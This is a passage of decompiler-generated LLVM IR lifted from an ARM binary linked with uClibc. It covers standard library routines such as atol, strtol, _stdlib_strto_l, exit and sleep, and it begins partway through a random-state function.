  br i1 %tmp29, label %dec_label_pc_1400c, label %dec_label_pc_13ffc

dec_label_pc_13ffc:                               ; preds = %dec_label_pc_13ff4
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_1407c

.thread10:                                        ; preds = %dec_label_pc_13ffc
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_1400c:                               ; preds = %dec_label_pc_13ff4
  %v2_1400c = icmp ugt i32 %arg2, 62
  %v7_1400c = icmp eq i32 %arg2, 63
  %v2_14010 = xor i1 %v7_1400c, true
  %v3_14010 = and i1 %v2_1400c, %v2_14010
  br i1 %v3_14010, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1400c
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1400c, %bb23
  %v1_140206 = phi i32 [ %v3_13fc4, %dec_label_pc_1400c ], [ 2, %bb23 ]
  %v2_14014 = xor i1 %v2_1400c, true
  %v3_14014 = or i1 %v7_1400c, %v2_14014
  br i1 %v3_14014, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_1402c = phi i32 [ 3, %bb22 ], [ %v1_140207, %bb21 ], [ %v1_140206, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33968), i32* %r3.global-to-local, align 4
  %v4_14020 = mul i32 %v1_1402c, 4
  %v5_14020 = add i32 %v4_14020, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33968)
  store i32 %v5_14020, i32* %r2.global-to-local, align 4
  %v1_14024 = add i32 %v4_14020, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33948)
  %v2_14024 = inttoptr i32 %v1_14024 to i32*
  %v3_14024 = load i32, i32* %v2_14024, align 4
  store i32 %v3_14024, i32* %r1.global-to-local, align 4
  %v1_14028 = add i32 %tmp, 4
  store i32 %v1_14028, i32* @r6, align 4
  %v6_1402c = inttoptr i32 %v5_14020 to i32*
  %v7_1402c = load i32, i32* %v6_1402c, align 4
  store i32 %v7_1402c, i32* %r2.global-to-local, align 4
  %v4_14030 = mul i32 %v3_14024, 4
  %v5_14030 = add i32 %v4_14030, %v1_14028
  store i32 %v5_14030, i32* %r3.global-to-local, align 4
  %v2_14034 = add i32 %arg3, 16
  %v3_14034 = inttoptr i32 %v2_14034 to i32*
  store i32 %v5_14030, i32* %v3_14034, align 4
  %v0_14038 = load i32, i32* %r2.global-to-local, align 4
  %v1_14038 = trunc i32 %v0_14038 to i8
  %v2_14038 = load i32, i32* @r5, align 4
  %v3_14038 = add i32 %v2_14038, 14
  %v4_14038 = inttoptr i32 %v3_14038 to i8*
  store i8 %v1_14038, i8* %v4_14038, align 1
  %v0_1403c = load i32, i32* %r1.global-to-local, align 4
  %v1_1403c = trunc i32 %v0_1403c to i8
  %v2_1403c = load i32, i32* @r5, align 4
  %v3_1403c = add i32 %v2_1403c, 13
  %v4_1403c = inttoptr i32 %v3_1403c to i8*
  store i8 %v1_1403c, i8* %v4_1403c, align 1
  %v0_14040 = load i32, i32* @r4, align 4
  %v1_14040 = trunc i32 %v0_14040 to i8
  %v2_14040 = load i32, i32* @r5, align 4
  %v3_14040 = add i32 %v2_14040, 12
  %v4_14040 = inttoptr i32 %v3_14040 to i8*
  store i8 %v1_14040, i8* %v4_14040, align 1
  %v0_14044 = load i32, i32* @r6, align 4
  %v1_14044 = load i32, i32* @r5, align 4
  %v2_14044 = add i32 %v1_14044, 8
  %v3_14044 = inttoptr i32 %v2_14044 to i32*
  store i32 %v0_14044, i32* %v3_14044, align 4
  %v0_14048 = load i32, i32* @r5, align 4
  store i32 %v0_14048, i32* %r1.global-to-local, align 4
  %v0_1404c = load i32, i32* @r0, align 4
  %v2_1404c = inttoptr i32 %v0_1404c to i32*
  %v3_1404c = call i32 @srandom_r(i32* %v2_1404c, i32 %v0_14048)
  store i32 %v3_1404c, i32* %r0.global-to-local, align 4
  %v0_14050 = load i32, i32* @r4, align 4
  %v2_14050 = icmp eq i32 %v0_14050, 0
  br i1 %v2_14050, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_1406c12 = load i32, i32* @r7, align 4
  %v2_1406c13 = inttoptr i32 %v1_1406c12 to i32*
  store i32 0, i32* %v2_1406c13, align 4
  %v1_14070 = load i32, i32* @r4, align 4
  store i32 %v1_14070, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14094

.thread4:                                         ; preds = %bb26
  %v1_14054 = load i32, i32* @r5, align 4
  %v2_14054 = add i32 %v1_14054, 4
  %v3_14054 = inttoptr i32 %v2_14054 to i32*
  %v4_14054 = load i32, i32* %v3_14054, align 4
  %v1_14058 = load i32, i32* @r6, align 4
  %v3_14058 = sub i32 %v4_14054, %v1_14058
  %v4_1405c = sdiv i32 %v3_14058, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_14064 = mul i32 %v4_1405c, 5
  %v5_14064 = add i32 %v4_14064, %v0_14050
  store i32 %v5_14064, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1406c = load i32, i32* @r7, align 4
  %v2_1406c = inttoptr i32 %v1_1406c to i32*
  store i32 0, i32* %v2_1406c, align 4
  %v1_14074 = load i32, i32* %r3.global-to-local, align 4
  %v2_14074 = load i32, i32* @r7, align 4
  %v3_14074 = inttoptr i32 %v2_14074 to i32*
  store i32 %v1_14074, i32* %v3_14074, align 4
  %v1_1409c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14094

dec_label_pc_1407c:                               ; preds = %dec_label_pc_13ffc
  %v0_1407c = call i32 @__GI___errno_location()
  store i32 %v0_1407c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_14084 = inttoptr i32 %v0_1407c to i32*
  store i32 22, i32* %v2_14084, align 4
  %v0_14088 = call i32 @__GI___errno_location()
  %v0_1408c = load i32, i32* %r4.global-to-local, align 4
  %v2_1408c = inttoptr i32 %v0_14088 to i32*
  store i32 %v0_1408c, i32* %v2_1408c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14094

dec_label_pc_14094:                               ; preds = %bb27, %.thread4, %dec_label_pc_1407c
  %v1_1409c = phi i32 [ %v1_1409c.pre, %.thread4 ], [ %v1_14070, %bb27 ], [ -1, %dec_label_pc_1407c ]
  store i32 %v3_13fc4, i32* @r4, align 4
  store i32 %v6_13fc4, i32* @r5, align 4
  ret i32 %v1_1409c

; uselistorder directives
  uselistorder i1 %v7_1400c, { 1, 0 }
  uselistorder i1 %v7_13fe4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33968), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_14094, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_140b8 = call i32 @strtol()
  ret i32 %v0_140b8
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_140d4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_140d4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_140f8 = load i32, i32* @r1, align 4
  store i32 %v0_140f8, i32* %fp.global-to-local, align 4
  %v0_140fc = load i32, i32* @r2, align 4
  store i32 %v0_140fc, i32* %r5.global-to-local, align 4
  %v0_14100 = load i32, i32* @r0, align 4
  store i32 %v0_14100, i32* %r4.global-to-local, align 4
  %v0_14104 = load i32, i32* @r3, align 4
  br label %dec_label_pc_14110

dec_label_pc_1410c:                               ; preds = %dec_label_pc_14110
  %v1_1410c = add i32 %v0_14148, 1
  store i32 %v1_1410c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14110

dec_label_pc_14110:                               ; preds = %entry, %dec_label_pc_1410c
  %v0_14148 = phi i32 [ %v0_14100, %entry ], [ %v1_1410c, %dec_label_pc_1410c ]
  %v1_14110 = inttoptr i32 %v0_14148 to i8*
  %v2_14110 = load i8, i8* %v1_14110, align 1
  %v3_14110 = zext i8 %v2_14110 to i32
  %v4_14114 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3528) to i32*), align 4
  store i32 %v4_14114, i32* @r2, align 4
  %v2_14118 = mul nuw nsw i32 %v3_14110, 2
  %v2_1411c = add i32 %v2_14118, %v4_14114
  %v3_1411c = inttoptr i32 %v2_1411c to i16*
  %v4_1411c = load i16, i16* %v3_1411c, align 2
  %v1_14120 = and i16 %v4_1411c, 32
  %v2_14120 = icmp eq i16 %v1_14120, 0
  br i1 %v2_14120, label %dec_label_pc_14128, label %dec_label_pc_1410c

dec_label_pc_14128:                               ; preds = %dec_label_pc_14110
  %v7_14128 = icmp eq i8 %v2_14110, 43
  br i1 %v7_14128, label %dec_label_pc_14148, label %dec_label_pc_14130

dec_label_pc_14130:                               ; preds = %dec_label_pc_14128
  %v7_14130 = icmp eq i8 %v2_14110, 45
  br i1 %v7_14130, label %dec_label_pc_14148, label %bb

bb:                                               ; preds = %dec_label_pc_14130
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1414c

dec_label_pc_14148:                               ; preds = %dec_label_pc_14128, %dec_label_pc_14130
  %storemerge47 = phi i32 [ 1, %dec_label_pc_14130 ], [ 0, %dec_label_pc_14128 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_14148 = add i32 %v0_14148, 1
  store i32 %v1_14148, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %bb, %dec_label_pc_14148
  %v0_1416c = phi i32 [ %v0_14148, %bb ], [ %v1_14148, %dec_label_pc_14148 ]
  %v1_1414c = and i32 %v0_140fc, -17
  %v3_1414c = icmp eq i32 %v1_1414c, 0
  br i1 %v3_1414c, label %dec_label_pc_14158, label %bb60

bb60:                                             ; preds = %dec_label_pc_1414c
  br label %bb64

dec_label_pc_14158:                               ; preds = %dec_label_pc_1414c
  %v1_14158 = inttoptr i32 %v0_1416c to i8*
  %v2_14158 = load i8, i8* %v1_14158, align 1
  %v7_1415c = icmp eq i8 %v2_14158, 48
  %v1_14160 = add i32 %v0_140fc, 10
  store i32 %v1_14160, i32* %r5.global-to-local, align 4
  br i1 %v7_1415c, label %dec_label_pc_1416c, label %bb61

bb61:                                             ; preds = %dec_label_pc_14158
  br label %.thread8

dec_label_pc_1416c:                               ; preds = %dec_label_pc_14158
  %v1_1416c = add i32 %v0_1416c, 1
  %v2_1416c = inttoptr i32 %v1_1416c to i8*
  %v3_1416c = load i8, i8* %v2_1416c, align 1
  %v4_1416c = zext i8 %v3_1416c to i32
  store i32 %v1_1416c, i32* %r4.global-to-local, align 4
  %v1_14170 = or i32 %v4_1416c, 32
  %v7_14174 = icmp eq i32 %v1_14170, 120
  %v1_14178 = add i32 %v0_140fc, 8
  store i32 %v1_14178, i32* %r5.global-to-local, align 4
  br i1 %v7_14174, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_1416c
  %v3_14184 = mul i32 %v1_14178, 2
  store i32 %v3_14184, i32* %r5.global-to-local, align 4
  %v2_14188 = add i32 %v0_1416c, 2
  store i32 %v2_14188, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1416c, %bb61, %bb62
  %v1_1425430 = phi i32 [ %v0_14100, %bb61 ], [ %v1_1416c, %bb62 ], [ %v1_1416c, %dec_label_pc_1416c ]
  %v0_141d821 = phi i32 [ %v0_1416c, %bb61 ], [ %v2_14188, %bb62 ], [ %v1_1416c, %dec_label_pc_1416c ]
  %v0_1418c = phi i32 [ %v1_14160, %bb61 ], [ %v3_14184, %bb62 ], [ %v1_14178, %dec_label_pc_1416c ]
  %v5_14190 = icmp slt i32 %v0_1418c, 16
  br i1 %v5_14190, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1425429 = phi i32 [ %v0_14100, %bb60 ], [ %v1_1425430, %.thread8 ], [ %v1_1425430, %bb63 ]
  %v0_141d820 = phi i32 [ %v0_1416c, %bb60 ], [ %v0_141d821, %.thread8 ], [ %v0_141d821, %bb63 ]
  %v0_141b8 = phi i32 [ %v0_140fc, %bb60 ], [ %v0_1418c, %.thread8 ], [ 16, %bb63 ]
  %v1_14194 = add i32 %v0_141b8, -2
  %tmp = icmp ugt i32 %v1_14194, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_141a4

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_14250

dec_label_pc_141a4:                               ; preds = %bb64
  %v2_141ac = udiv i32 -1, %v0_141b8
  %v3_141ac = urem i32 -1, %v0_141b8
  %v1_141bc = urem i32 %v3_141ac, 256
  store i32 %v1_141bc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_141ac, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_141d8

dec_label_pc_141d4:                               ; preds = %bb71, %dec_label_pc_14234
  %v0_141d4 = phi i32 [ %v1_1421444, %bb71 ], [ %v0_141d4.pre, %dec_label_pc_14234 ]
  br label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141a4, %dec_label_pc_141d4
  %v1_1425427 = phi i32 [ %v1_1425429, %dec_label_pc_141a4 ], [ %v0_141d4, %dec_label_pc_141d4 ]
  %v0_14214 = phi i32 [ %v0_141d820, %dec_label_pc_141a4 ], [ %v0_141d4, %dec_label_pc_141d4 ]
  %v1_141d8 = inttoptr i32 %v0_14214 to i8*
  %v2_141d8 = load i8, i8* %v1_141d8, align 1
  %v3_141d8 = zext i8 %v2_141d8 to i32
  %v1_141dc = add nsw i32 %v3_141d8, -48
  %v1_141e0 = urem i32 %v1_141dc, 256
  %v1_141e8 = or i32 %v3_141d8, 32
  store i32 %v1_141e8, i32* @r2, align 4
  %tmp79 = icmp ult i32 %v1_141e0, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_141f0

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141d8
  %v1_141f4 = add nsw i32 %v1_141e8, -87
  store i32 %v1_141f4, i32* @r2, align 4
  %tmp80 = icmp ugt i32 %v1_141e8, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_141f0
  %v5_141fc = urem i32 %v1_141f4, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_141d8, %dec_label_pc_141f0, %bb65
  %v3_1422c = phi i32 [ %v1_141e0, %dec_label_pc_141d8 ], [ 40, %dec_label_pc_141f0 ], [ %v5_141fc, %bb65 ]
  %v1_14200 = load i32, i32* %r5.global-to-local, align 4
  %v6_14204 = icmp slt i32 %v3_1422c, %v1_14200
  br i1 %v6_14204, label %dec_label_pc_14208, label %dec_label_pc_14250.loopexit

dec_label_pc_14208:                               ; preds = %bb66
  %v0_14208 = load i32, i32* @ip, align 4
  %v1_14208 = load i32, i32* %r8.global-to-local, align 4
  %v9_14208 = icmp eq i32 %v0_14208, %v1_14208
  br i1 %v9_14208, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_14208
  %v1_1421440 = add i32 %v0_14214, 1
  store i32 %v1_1421440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1421c

bb67:                                             ; preds = %dec_label_pc_14208
  %v3_14208 = icmp ult i32 %v0_14208, %v1_14208
  %v1_14214 = add i32 %v0_14214, 1
  store i32 %v1_14214, i32* %r4.global-to-local, align 4
  br i1 %v3_14208, label %dec_label_pc_1421c, label %dec_label_pc_14234

dec_label_pc_1421c:                               ; preds = %bb67, %.thread39
  %v1_1421444 = phi i32 [ %v1_1421440, %.thread39 ], [ %v1_14214, %bb67 ]
  %v4_142242443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1421c = load i32, i32* %sl.global-to-local, align 4
  %v3_1421c = icmp uge i32 %v3_1422c, %v1_1421c
  %v9_1421c = icmp eq i32 %v3_1422c, %v1_1421c
  %v2_14220 = xor i1 %v3_1421c, true
  %v3_14220 = or i1 %v9_1421c, %v2_14220
  br i1 %v3_14220, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1421c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1421c, %bb68
  %v4_14224 = phi i32 [ %v4_142242443, %dec_label_pc_1421c ], [ 0, %bb68 ]
  %v2_14224 = xor i1 %v9_1421c, true
  %v3_14224 = and i1 %v3_1421c, %v2_14224
  br i1 %v3_14224, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_14224 = urem i32 %v4_14224, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_14228 = phi i32 [ %v5_14224, %bb70 ], [ %v4_14224, %bb69 ]
  %v2_14228 = icmp eq i32 %v0_14228, 0
  br i1 %v2_14228, label %bb71, label %dec_label_pc_14234

bb71:                                             ; preds = %thread-pre-split
  %v4_1422c = mul i32 %v0_14208, %v1_14200
  %v5_1422c = add i32 %v4_1422c, %v3_1422c
  store i32 %v5_1422c, i32* @ip, align 4
  br label %dec_label_pc_141d4

dec_label_pc_14234:                               ; preds = %bb67, %thread-pre-split
  %v0_14234 = call i32 @__GI___errno_location()
  %v0_1423c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1423c, i32* @ip, align 4
  %v0_14240 = load i32, i32* %r7.global-to-local, align 4
  %v2_14240 = and i32 %v0_14240, %v0_14104
  store i32 %v2_14240, i32* %r7.global-to-local, align 4
  %v2_14248 = inttoptr i32 %v0_14234 to i32*
  store i32 34, i32* %v2_14248, align 4
  %v0_141d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_141d4

dec_label_pc_14250.loopexit:                      ; preds = %bb66
  %v0_14250.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %.thread, %dec_label_pc_14250.loopexit
  %v1_14254 = phi i32 [ %v1_1425427, %dec_label_pc_14250.loopexit ], [ %v1_1425429, %.thread ]
  %v2_14254 = phi i32 [ %v0_14250.pre, %dec_label_pc_14250.loopexit ], [ %v0_140f8, %.thread ]
  %v2_14250 = icmp eq i32 %v2_14254, 0
  br i1 %v2_14250, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14250
  %v3_14254 = inttoptr i32 %v2_14254 to i32*
  store i32 %v1_14254, i32* %v3_14254, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_14250, %bb72
  %v0_1425c = load i32, i32* %r7.global-to-local, align 4
  %v2_1425c = icmp eq i32 %v0_1425c, 0
  %. = select i1 %v2_1425c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_14268 = icmp eq i32 %v0_14104, 0
  %v0_1428c.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_14268, label %dec_label_pc_14284, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_1428c.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_14274, label %dec_label_pc_14284

dec_label_pc_14274:                               ; preds = %bb76
  %v0_14274 = call i32 @__GI___errno_location()
  %v2_1427c = inttoptr i32 %v0_14274 to i32*
  store i32 34, i32* %v2_1427c, align 4
  %v0_14280 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14280, i32* @ip, align 4
  %v0_14284.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %bb76, %bb73, %dec_label_pc_14274
  %v0_1428c.pre = phi i32 [ %v0_1428c.pre.pre, %bb76 ], [ %v0_14280, %dec_label_pc_14274 ], [ %v0_1428c.pre.pre, %bb73 ]
  %v0_14284 = phi i32 [ %v0_1425c, %bb76 ], [ %v0_14284.pre, %dec_label_pc_14274 ], [ %v0_1425c, %bb73 ]
  %v2_14284 = icmp eq i32 %v0_14284, 0
  br i1 %v2_14284, label %dec_label_pc_14284._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_14284
  %v2_14288 = sub i32 0, %v0_1428c.pre
  store i32 %v2_14288, i32* @ip, align 4
  br label %dec_label_pc_14284._crit_edge

dec_label_pc_14284._crit_edge:                    ; preds = %dec_label_pc_14284, %bb77
  %v0_1428c = phi i32 [ %v2_14288, %bb77 ], [ %v0_1428c.pre, %dec_label_pc_14284 ]
  ret i32 %v0_1428c

; uselistorder directives
  uselistorder i32 %v0_1428c.pre, { 1, 0 }
  uselistorder i32 %v0_1428c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_14224, { 1, 0 }
  uselistorder i1 %v3_1421c, { 1, 0 }
  uselistorder i32 %v1_1421c, { 1, 0 }
  uselistorder i32 %v1_141e0, { 1, 0 }
  uselistorder i32 %v0_14214, { 1, 0, 2 }
  uselistorder i32 %v0_141d4, { 1, 0 }
  uselistorder i32 %v3_14184, { 1, 0 }
  uselistorder i32 %v1_14178, { 1, 0, 2 }
  uselistorder i32 %v0_1416c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14148, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14104, { 1, 0 }
  uselistorder i32 %v0_14100, { 1, 0, 2, 3 }
  uselistorder i32 %v0_140fc, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_14284._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14284, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_14250, { 1, 0 }
  uselistorder label %dec_label_pc_14234, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_141d8, { 1, 0 }
  uselistorder label %dec_label_pc_141d4, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1414c, { 1, 0 }
  uselistorder label %dec_label_pc_14148, { 1, 0 }
  uselistorder label %dec_label_pc_14110, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  %v4_142b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 92) to i32*), align 4
  store i32 %v4_142b0, i32* @r4, align 4
  %v2_142b8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_142d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_142d0)
  %v0_142e4 = load i32, i32* @r5, align 4
  %v2_142e4 = add i32 %v0_142e4, 16
  %v3_142e4 = inttoptr i32 %v2_142e4 to i32*
  %v4_142e4 = load i32, i32* %v3_142e4, align 4
  call void @__pseudo_branch(i32 %v4_142e4)
  %v0_142f4 = load i32, i32* @r5, align 4
  %v2_142f4 = add i32 %v0_142f4, 29284
  %v3_142f4 = inttoptr i32 %v2_142f4 to i32*
  %v4_142f4 = load i32, i32* %v3_142f4, align 4
  %v2_142f8 = icmp eq i32 %v4_142f4, 0
  br i1 %v2_142f8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_14304 = xor i1 %v2_142f8, true
  call void @__pseudo_cond_branch(i1 %v2_14304, i32 %v4_142f4)
  store i32 %v2_142b8, i32* @r0, align 4
  %v0_14314 = load i32, i32* @r5, align 4
  %v2_14314 = add i32 %v0_14314, 24
  %v3_14314 = inttoptr i32 %v2_14314 to i32*
  %v4_14314 = load i32, i32* %v3_14314, align 4
  call void @__pseudo_branch(i32 %v4_14314)
  %v0_14320 = call i32 @__GI___uClibc_fini()
  %v0_14328 = load i32, i32* @r5, align 4
  %v2_14328 = add i32 %v0_14328, -91848
  %v9_14328 = icmp eq i32 %v2_14328, 0
  br i1 %v9_14328, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_14330 = xor i1 %v9_14328, true
  call void @__pseudo_cond_branch(i1 %v2_14330, i32 %v2_14328)
  %v0_14334 = load i32, i32* @r6, align 4
  %v1_14338 = call i32 @__GI__exit(i32 %v0_14334)
  %v0_1433c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1433c, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_1433c = load i32, i32* @r1, align 4
  %v5_1433c = udiv i32 %v1_14338, 4096
  %v6_1433c = and i32 %v1_1433c, %v5_1433c
  store i32 %v6_1433c, i32* @r2, align 4
  store i32 0, i32* @r7, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_14354 = phi i32 [ %v1_14338, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_14354

; uselistorder directives
  uselistorder i32 %v1_14338, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1435c = load i32, i32* @r4, align 4
  %v6_1435c = load i32, i32* @lr, align 4
  %v2_14360 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_14360, label %dec_label_pc_143f4, label %dec_label_pc_14370

dec_label_pc_14370:                               ; preds = %entry
  %v2_14380 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_14394 = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_14380)
  %v3_14398 = load i32, i32* %stack_var_-44, align 4
  %v7_1439c = icmp eq i32 %v3_14398, 1
  br i1 %v7_1439c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14370
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14370, %bb
  call void @__pseudo_cond_branch(i1 %v7_1439c, i32 ptrtoint (i32* @global_var_facc.799 to i32))
  %v2_143b0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_143b8 = call i32 @__libc_nanosleep(i32 %v2_143b0, i32 %v2_143b0)
  %v2_143bc = icmp eq i32 %v2_143b8, 0
  br i1 %v2_143bc, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_143d0 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_143d0, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_143e0 = load i32, i32* %stack_var_-24, align 4
  %v1_143e4 = and i32 %v3_143e0, 65536
  %v2_143e4 = icmp eq i32 %v1_143e4, 0
  br i1 %v2_143e4, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_143e4, i32 ptrtoint (i32* @global_var_facc.799 to i32))
  %v0_143f4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_143f4

dec_label_pc_143f4:                               ; preds = %entry, %.thread6
  %v0_143f4 = phi i32 [ %v0_143f4.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_1435c, i32* @r4, align 4
  store i32 %v6_1435c, i32* @lr, align 4
  ret i32 %v0_143f4

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder label %dec_label_pc_143f4, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

